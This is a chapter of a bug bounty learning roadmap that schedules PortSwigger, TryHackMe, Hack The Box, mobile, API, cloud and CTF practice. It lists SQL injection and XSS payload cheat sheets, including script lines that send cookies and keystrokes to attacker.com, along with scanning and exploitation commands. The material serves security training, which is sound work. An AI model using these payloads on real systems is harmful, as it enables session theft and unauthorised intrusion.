# 🧪 Phase 3: Hands-On Practice (Months 4-8)

> **Goal**: Develop practical skills through hands-on labs, CTF challenges, and vulnerable applications

## 📚 Learning Objectives

By the end of this phase, you will:
- ✅ Complete 100+ security labs and challenges
- ✅ Master vulnerability exploitation techniques
- ✅ Be proficient with security testing tools
- ✅ Have practical experience with all major vulnerability types
- ✅ Understand real-world attack scenarios

## 🎯 Phase Overview

| Month | Focus Area | Labs/Challenges | Key Skills |
|-------|------------|----------------|------------|
| 4 | PortSwigger Academy | 50+ labs | Web security fundamentals |
| 5 | TryHackMe Paths | 30+ rooms | Practical penetration testing |
| 6 | Hack The Box | 20+ machines | Advanced exploitation |
| 7 | Specialized Labs | 25+ challenges | Mobile, API, Cloud security |
| 8 | CTF Competitions | 5+ CTFs | Competition experience |

## 🏆 PortSwigger Web Security Academy (FREE - Priority #1)

> **Why Start Here**: Industry-standard labs, progressive difficulty, covers all OWASP Top 10

### 📊 Academy Statistics
- **190+ Interactive Labs**
- **11 Vulnerability Categories**
- **Free Certification Path**
- **Used by 87% of Security Professionals**

### 🎓 Learning Path Structure

#### 1. SQL Injection (20 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| SQL injection vulnerability in WHERE clause | Apprentice | Basic SQLi detection |
| SQL injection UNION attack | Practitioner | Data extraction techniques |
| Blind SQL injection with conditional responses | Practitioner | Boolean-based blind SQLi |
| Blind SQL injection with time delays | Practitioner | Time-based blind SQLi |
| SQL injection with filter bypass | Expert | Advanced evasion techniques |

**🔧 Essential SQLi Payloads**
```sql
-- Basic detection
' OR '1'='1
" OR "1"="1
' OR 1=1--
') OR ('1'='1

-- Union-based extraction
' UNION SELECT null,null,null--
' UNION SELECT username,password FROM users--
' UNION SELECT @@version,null,null--

-- Boolean-based blind
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--

-- Time-based blind
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT SLEEP(5))--
'; SELECT pg_sleep(5)--
```

#### 2. Cross-Site Scripting (XSS) (30 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| Reflected XSS into HTML context | Apprentice | Basic XSS concepts |
| Stored XSS into HTML context | Apprentice | Persistent XSS |
| DOM XSS in document.write sink | Practitioner | Client-side XSS |
| Reflected XSS with some SVG markup allowed | Expert | Filter bypass techniques |
| Stored XSS into onclick event | Expert | Event-based XSS |

**🔧 Essential XSS Payloads**
```javascript
// Basic XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Filter bypasses
<ScRiPt>alert('XSS')</ScRiPt>
<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
<svg><script>alert&#40;'XSS'&#41;</script>

// Advanced payloads
<script>fetch('/admin',{method:'POST',body:'action=delete&user=victim'})</script>
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
<script>new Image().src='http://attacker.com/keylog?key='+event.key</script>
```

#### 3. Cross-Site Request Forgery (CSRF) (8 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| CSRF vulnerability with no defenses | Apprentice | Basic CSRF concepts |
| CSRF where token validation depends on request method | Practitioner | Method-based bypasses |
| CSRF where token is not tied to user session | Practitioner | Token validation flaws |
| SameSite Lax bypass via method override | Expert | Advanced CSRF techniques |

#### 4. Clickjacking (5 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| Basic clickjacking with CSRF token protection | Apprentice | Frame-based attacks |
| Clickjacking with form input data prefilled | Practitioner | Data prefilling attacks |
| Frame busting script with a form submission | Expert | Frame busting bypasses |

#### 5. DOM-based Vulnerabilities (7 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| DOM XSS using web messages | Practitioner | PostMessage vulnerabilities |
| DOM XSS using web messages and a JavaScript URL | Practitioner | JavaScript protocol abuse |
| DOM-based open redirection | Practitioner | Client-side redirects |

#### 6. Cross-Origin Resource Sharing (CORS) (4 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| CORS vulnerability with basic origin reflection | Apprentice | Basic CORS misconfigurations |
| CORS vulnerability with trusted null origin | Practitioner | Null origin bypasses |
| CORS vulnerability with internal network pivot | Expert | Internal network access |

#### 7. XML External Entity (XXE) Injection (9 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| Exploiting XXE using external entities to retrieve files | Apprentice | Basic XXE file retrieval |
| Exploiting XXE to perform SSRF attacks | Practitioner | XXE-based SSRF |
| Blind XXE with out-of-band interaction | Practitioner | Out-of-band XXE |
| Exploiting XInclude to retrieve files | Expert | XInclude-based XXE |

#### 8. Server-Side Request Forgery (SSRF) (11 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| Basic SSRF against the local server | Apprentice | Local server access |
| Basic SSRF against another back-end system | Apprentice | Internal network scanning |
| SSRF with blacklist-based input filter | Practitioner | Filter bypass techniques |
| SSRF with filter bypass via open redirection | Expert | Redirect-based bypasses |

#### 9. HTTP Request Smuggling (15 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| HTTP request smuggling, basic CL.TE vulnerability | Expert | Content-Length vs Transfer-Encoding |
| HTTP request smuggling, basic TE.CL vulnerability | Expert | Transfer-Encoding vs Content-Length |
| HTTP request smuggling, obfuscating the TE header | Expert | Header obfuscation techniques |

#### 10. OS Command Injection (5 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| OS command injection, simple case | Apprentice | Basic command injection |
| Blind OS command injection with time delays | Practitioner | Time-based detection |
| Blind OS command injection with output redirection | Practitioner | Output redirection techniques |

#### 11. Server-Side Template Injection (7 Labs)
| Lab | Difficulty | Key Learning |
|-----|------------|--------------|
| Basic server-side template injection | Practitioner | Template engine exploitation |
| Basic server-side template injection (code context) | Practitioner | Code context injection |
| Server-side template injection with information disclosure | Expert | Information gathering via SSTI |

### 📅 PortSwigger Academy Schedule (Month 4)

| Week | Labs to Complete | Focus Area | Time Investment |
|------|------------------|------------|----------------|
| 1 | SQL Injection (1-10) | Basic to intermediate SQLi | 15-20 hours |
| 2 | SQL Injection (11-20) + XSS (1-10) | Advanced SQLi + Basic XSS | 15-20 hours |
| 3 | XSS (11-20) + CSRF + Clickjacking | XSS mastery + CSRF | 15-20 hours |
| 4 | SSRF + XXE + Command Injection | Server-side vulnerabilities | 15-20 hours |

### 🏅 PortSwigger Certification Path

After completing labs, pursue the **Burp Suite Certified Practitioner (BSCP)** certification:
- **Exam Format**: Practical hands-on exam
- **Duration**: 4 hours
- **Cost**: $99 USD
- **Recognition**: Industry-recognized certification

## 🚀 TryHackMe Learning Paths (Month 5)

> **Why TryHackMe**: Gamified learning, beginner-friendly, comprehensive paths

### 🎯 Recommended Learning Paths

#### 1. Complete Beginner Path (25 Rooms)
| Room | Difficulty | Key Learning | Time |
|------|------------|--------------|------|
| OhSINT | Easy | OSINT techniques | 2 hours |
| Google Dorking | Easy | Search engine hacking | 1 hour |
| Vulnversity | Easy | Basic web app testing | 2 hours |
| Basic Pentesting | Easy | Enumeration and exploitation | 3 hours |
| Kenobi | Medium | SMB and privilege escalation | 2 hours |

#### 2. Web Fundamentals Path (20 Rooms)
| Room | Difficulty | Key Learning | Time |
|------|------------|--------------|------|
| How websites work | Info | Web technology basics | 1 hour |
| HTTP in detail | Info | HTTP protocol deep dive | 1 hour |
| Burp Suite: The Basics | Easy | Proxy tool usage | 2 hours |
| OWASP Top 10 | Easy | Web vulnerabilities | 4 hours |
| OWASP Juice Shop | Easy | Practical web hacking | 3 hours |

#### 3. Penetration Testing Path (15 Rooms)
| Room | Difficulty | Key Learning | Time |
|------|------------|--------------|------|
| Nmap | Easy | Network scanning | 2 hours |
| Network Services | Easy | Service enumeration | 3 hours |
| Network Services 2 | Easy | Advanced enumeration | 3 hours |
| Protocols and Servers | Easy | Protocol analysis | 2 hours |
| Protocols and Servers 2 | Easy | Advanced protocols | 2 hours |

### 🔧 Essential TryHackMe Rooms for Bug Bounty

#### Web Application Security
```
1. OWASP Top 10 - Core vulnerabilities
2. OWASP Juice Shop - Practical exploitation
3. Burp Suite Basics - Tool mastery
4. Web Fundamentals - HTTP deep dive
5. Upload Vulnerabilities - File upload attacks
6. Authentication Bypass - Auth flaws
7. SQL Injection - Database attacks
8. Cross-site Scripting - XSS techniques
9. Command Injection - OS command execution
10. IDOR - Access control flaws
```

#### Network Security
```
1. Nmap - Network scanning
2. Network Services - Service enumeration
3. Protocols and Servers - Protocol analysis
4. Network Security Solutions - Firewall/IDS evasion
5. Wireshark - Traffic analysis
```

#### System Security
```
1. Linux Fundamentals - OS basics
2. Windows Fundamentals - Windows security
3. Active Directory Basics - AD security
4. Privilege Escalation - Escalation techniques
```

### 📅 TryHackMe Schedule (Month 5)

| Week | Rooms to Complete | Focus Area | Time Investment |
|------|------------------|------------|----------------|
| 1 | Complete Beginner (1-7) | Basic concepts | 15-20 hours |
| 2 | Web Fundamentals (1-5) | Web security | 15-20 hours |
| 3 | OWASP Top 10 + Juice Shop | Vulnerability practice | 15-20 hours |
| 4 | Penetration Testing (1-5) | Testing methodology | 15-20 hours |

## 🎯 Hack The Box (Month 6)

> **Why HTB**: Real-world scenarios, advanced techniques, professional environment

### 🏆 HTB Learning Approach

#### Starting Boxes (Easy Difficulty)
| Box Name | OS | Key Vulnerabilities | Skills Learned |
|----------|----|--------------------|----------------|
| Lame | Linux | SMB vulnerabilities | Service exploitation |
| Legacy | Windows | MS08-067 | Windows exploitation |
| Blue | Windows | EternalBlue | SMB exploitation |
| Jerry | Windows | Tomcat default creds | Web app exploitation |
| Netmon | Windows | FTP anonymous access | File system access |

#### Web Application Boxes
| Box Name | Difficulty | Key Vulnerabilities | Skills Learned |
|----------|------------|-------------------|----------------|
| Beep | Easy | Multiple web services | Service enumeration |
| Sense | Easy | pfSense exploitation | Firewall exploitation |
| Shocker | Easy | Shellshock vulnerability | CGI exploitation |
| Nibbles | Easy | File upload vulnerability | Web app exploitation |
| Bashed | Easy | Web shell upload | File upload attacks |

### 🛠️ HTB Methodology

#### 1. Reconnaissance Phase
```bash
# Nmap scanning
nmap -sC -sV -oA initial_scan $TARGET_IP
nmap -p- -oA full_scan $TARGET_IP
nmap -sU --top-ports 1000 -oA udp_scan $TARGET_IP

# Service enumeration
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
nikto -h http://$TARGET_IP
```

#### 2. Exploitation Phase
```bash
# Web application testing
sqlmap -u "http://$TARGET_IP/page.php?id=1" --dbs
wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --hc 404 http://$TARGET_IP/FUZZ

# Service exploitation
searchsploit $SERVICE_NAME $VERSION
msfconsole
```

#### 3. Post-Exploitation Phase
```bash
# Linux privilege escalation
linpeas.sh
sudo -l
find / -perm -4000 2>/dev/null

# Windows privilege escalation
winpeas.exe
whoami /priv
systeminfo
```

### 📅 HTB Schedule (Month 6)

| Week | Boxes to Complete | Focus Area | Time Investment |
|------|------------------|------------|----------------|
| 1 | 3 Easy Linux boxes | Linux exploitation | 15-20 hours |
| 2 | 3 Easy Windows boxes | Windows exploitation | 15-20 hours |
| 3 | 2 Medium boxes | Advanced techniques | 15-20 hours |
| 4 | Web app focused boxes | Web exploitation | 15-20 hours |

## 🔬 Specialized Security Labs (Month 7)

### 📱 Mobile Application Security

#### OWASP MASTG Labs
| Lab | Platform | Vulnerability | Skills Learned |
|-----|----------|---------------|----------------|
| UnCrackable L1 | Android | Root detection bypass | Mobile reverse engineering |
| UnCrackable L2 | Android | Anti-debugging bypass | Advanced mobile security |
| UnCrackable L3 | Android | Native code analysis | Binary analysis |
| DVIA | iOS | Various iOS vulns | iOS security testing |

#### Mobile Testing Tools
```bash
# Android tools
adb devices
adb shell
frida -U -f com.example.app -l script.js

# iOS tools (requires jailbroken device)
frida -U -f com.example.app -l script.js
class-dump-z app.ipa
otool -L app
```

### 🔌 API Security Testing

#### OWASP crAPI Labs
| Vulnerability | API Type | Testing Technique |
|---------------|----------|------------------|
| BOLA/IDOR | REST | Object reference manipulation |
| Broken Authentication | GraphQL | Token analysis |
| Excessive Data Exposure | REST | Response analysis |
| Rate Limiting | REST | Automated testing |
| Mass Assignment | REST | Parameter pollution |

#### API Testing Tools
```bash
# REST API testing
curl -X GET "https://api.example.com/users/1" -H "Authorization: Bearer $TOKEN"
postman # GUI tool for API testing
insomnia # Alternative API client

# GraphQL testing
graphql-playground
graphiql
```

### ☁️ Cloud Security Labs

#### AWS Security Labs
| Lab | Service | Vulnerability | Skills Learned |
|-----|---------|---------------|----------------|
| S3 Bucket Enumeration | S3 | Public buckets | Cloud storage security |
| IAM Privilege Escalation | IAM | Role assumptions | Identity management |
| Lambda Function Analysis | Lambda | Code injection | Serverless security |
| RDS Security | RDS | Database exposure | Database security |

#### Cloud Testing Tools
```bash
# AWS CLI
aws s3 ls s3://bucket-name --no-sign-request
aws iam list-users
aws ec2 describe-instances

# Cloud enumeration
cloud_enum -k company
s3scanner -l bucket_list.txt
```

### 📅 Specialized Labs Schedule (Month 7)

| Week | Focus Area | Labs/Challenges | Time Investment |
|------|------------|----------------|----------------|
| 1 | Mobile Security | MASTG labs 1-5 | 15-20 hours |
| 2 | API Security | crAPI + custom APIs | 15-20 hours |
| 3 | Cloud Security | AWS security labs | 15-20 hours |
| 4 | IoT/Hardware | Hardware hacking basics | 15-20 hours |

## 🏁 CTF Competitions (Month 8)

> **Why CTFs**: Competition experience, time pressure, diverse challenges

### 🎯 Recommended CTF Platforms

#### Beginner-Friendly CTFs
| Platform | Difficulty | Focus Area | Frequency |
|----------|------------|------------|-----------|
| PicoCTF | Beginner | Educational | Annual |
| HSCTF | Beginner | High school level | Annual |
| CSAW CTF | Intermediate | University level | Annual |
| Google CTF | Advanced | Professional | Annual |

#### Online CTF Platforms
| Platform | Type | Challenges | Cost |
|----------|------|------------|------|
| CTFtime | Directory | Event listings | Free |
| OverTheWire | Wargames | Progressive challenges | Free |
| HackTheBox CTFs | Competitions | Monthly events | Paid |
| TryHackMe CTFs | Competitions | Regular events | Freemium |

### 🔧 CTF Challenge Categories

#### Web Exploitation
```python
# Common CTF web challenges
- SQL injection with custom filters
- XSS in unusual contexts
- Template injection
- Deserialization attacks
- Race conditions
- Business logic flaws
```

#### Cryptography
```python
# Crypto challenge types
- Classical ciphers (Caesar, Vigenère)
- RSA attacks (small exponent, common modulus)
- Hash collisions
- Random number generator flaws
- Timing attacks
```

#### Reverse Engineering
```python
# RE challenge types
- Binary analysis
- Malware analysis
- Protocol reverse engineering
- Obfuscated code analysis
- Anti-debugging bypass
```

#### Forensics
```python
# Forensics challenge types
- Network packet analysis
- Memory dump analysis
- File system forensics
- Steganography
- Log analysis
```

### 🏆 CTF Strategy and Methodology

#### Pre-Competition Preparation
1. **Team Formation**: 3-5 members with diverse skills
2. **Tool Setup**: Ensure all tools are ready
3. **Communication**: Set up Discord/Slack channels
4. **Role Assignment**: Web, crypto, RE, forensics specialists

#### During Competition
1. **Challenge Triage**: Identify easy wins first
2. **Parallel Work**: Multiple challenges simultaneously
3. **Knowledge Sharing**: Share findings with team
4. **Time Management**: Don't get stuck on one challenge

#### Post-Competition Analysis
1. **Writeup Review**: Study other teams' solutions
2. **Skill Gap Analysis**: Identify areas for improvement
3. **Tool Enhancement**: Update toolkit based on learnings

### 📅 CTF Schedule (Month 8)

| Week | Activity | Focus | Time Investment |
|------|----------|-------|----------------|
| 1 | Practice CTF challenges | Individual skill building | 15-20 hours |
| 2 | Team formation and practice | Team coordination | 15-20 hours |
| 3 | Participate in live CTF | Competition experience | 20-30 hours |
| 4 | Writeup analysis and learning | Post-competition improvement | 10-15 hours |

## 🛠️ Essential Tools Mastery

### 🔧 Burp Suite Professional Features

#### Advanced Scanner
```
- Automated vulnerability detection
- Custom scan configurations
- Integration with manual testing
- Detailed vulnerability reports
```

#### Intruder Module
```
- Automated attacks (brute force, fuzzing)
- Custom payload processing
- Rate limiting and threading
- Result analysis and filtering
```

#### Repeater and Comparer
```
- Manual request manipulation
- Response comparison
- Encoding/decoding utilities
- Request history management
```

### 🔍 OWASP ZAP Advanced Usage

#### Automated Scanning
```bash
# Command line scanning
zap-baseline.py -t https://example.com
zap-full-scan.py -t https://example.com

# API scanning
zap-api-scan.py -t https://api.example.com/openapi.json
```

#### Custom Scripts
```python
# ZAP scripting example
def scanNode(sas, msg):
    # Custom vulnerability detection logic
    if "vulnerable_pattern" in msg.getResponseBody().toString():
        sas.raiseAlert(risk, confidence, name, description)
```

### 🌐 Reconnaissance Tool Mastery

#### Subdomain Enumeration Workflow
```bash
# Passive enumeration
subfinder -d example.com -o subdomains.txt
amass enum -passive -d example.com -o amass_passive.txt
assetfinder example.com | tee assetfinder.txt

# Active enumeration
amass enum -active -d example.com -o amass_active.txt
dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt

# Validation and filtering
httpx -l subdomains.txt -o live_subdomains.txt
cat live_subdomains.txt | aquatone
```

#### Content Discovery
```bash
# Directory enumeration
gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt -o gobuster.txt

# Parameter discovery
paramspider -d example.com -o params.txt
arjun -u https://example.com -oT arjun_params.txt

# JavaScript analysis
linkfinder -i https://example.com -o cli
```

## 📊 Phase 3 Assessment

### ✅ Practical Skills Checklist

Before moving to Phase 4, ensure you can:

#### Lab Completion
- [ ] Complete 50+ PortSwigger Academy labs
- [ ] Finish 30+ TryHackMe rooms
- [ ] Solve 20+ Hack The Box machines
- [ ] Complete specialized security labs (mobile, API, cloud)
- [ ] Participate in 3+ CTF competitions

#### Tool Proficiency
- [ ] Master Burp Suite Professional features
- [ ] Use OWASP ZAP for automated scanning
- [ ] Perform comprehensive reconnaissance
- [ ] Analyze network traffic with Wireshark
- [ ] Use command-line tools effectively

#### Exploitation Skills
- [ ] Exploit all OWASP Top 10 vulnerabilities
- [ ] Perform privilege escalation on Linux/Windows
- [ ] Analyze and exploit binary applications
- [ ] Test mobile applications for security flaws
- [ ] Assess API security comprehensively

### 🎯 Capstone Project

Create a comprehensive security assessment of a complex application:

1. **[Full Stack Security Assessment](exercises/full-stack-assessment.md)**: Complete security testing of a multi-tier application
2. **[Mobile App Security Review](exercises/mobile-security-review.md)**: Comprehensive mobile application security assessment
3. **[API Security Audit](exercises/api-security-audit.md)**: Complete API security testing and documentation

### 📈 Progress Tracking

| Skill Category | Beginner | Intermediate | Advanced | Expert | Your Level |
|----------------|----------|--------------|----------|--------|------------|
| Web App Testing | Basic vulns | OWASP Top 10 | Advanced techniques | Zero-day research | [ ] |
| Network Security | Port scanning | Service enum | Advanced exploitation | Custom exploits | [ ] |
| Mobile Security | Basic testing | Platform-specific | Reverse engineering | Advanced bypass | [ ] |
| API Security | REST basics | GraphQL testing | Advanced attacks | Custom tooling | [ ] |
| Tool Usage | Basic features | Advanced usage | Custom configs | Tool development | [ ] |

## 🎉 Phase 3 Completion

Excellent work! You now have extensive hands-on experience. You should:

- ✅ Have completed 100+ security labs and challenges
- ✅ Be proficient with all major security testing tools
- ✅ Have practical exploitation experience across multiple domains
- ✅ Understand real-world attack scenarios and methodologies
- ✅ Be ready to learn advanced tools and automation techniques

## 🚀 Next Steps

Ready for Phase 4? Move on to [Phase 4: Essential Tools and Technologies](../phase-04-essential-tools/) where you'll:

- Master advanced security tools and frameworks
- Learn automation and scripting for bug bounty hunting
- Understand reconnaissance at scale
- Build custom tools for specific testing scenarios

## 📚 Additional Practice Resources

### Free Vulnerable Applications
- [DVWA](http://www.dvwa.co.uk/) - Damn Vulnerable Web Application
- [bWAPP](http://www.itsecgames.com/) - Buggy Web Application
- [WebGoat](https://owasp.org/www-project-webgoat/) - OWASP WebGoat
- [Mutillidae](https://sourceforge.net/projects/mutillidae/) - OWASP Mutillidae

### CTF Practice Platforms
- [OverTheWire](https://overthewire.org/wargames/) - Progressive wargames
- [SmashTheStack](http://smashthestack.org/) - Binary exploitation
- [Exploit Exercises](https://exploit-exercises.lains.space/) - System exploitation
- [Root Me](https://www.root-me.org/) - Hacking challenges

### Mobile Security Resources
- [OWASP MSTG](https://owasp.org/www-project-mobile-security-testing-guide/) - Mobile Security Testing Guide
- [Android Security Internals](http://www.nostarch.com/androidsecurity) - Book on Android security
- [iOS Application Security](https://nostarch.com/iossecurity) - iOS security testing

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**⏱️ Estimated Time to Complete**: 4-5 months (15-25 hours/week)
**🎯 Success Rate**: 80% of students who complete all labs move successfully to Phase 4
**📈 Next Phase**: [Phase 4: Essential Tools and Technologies](../phase-04-essential-tools/)

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*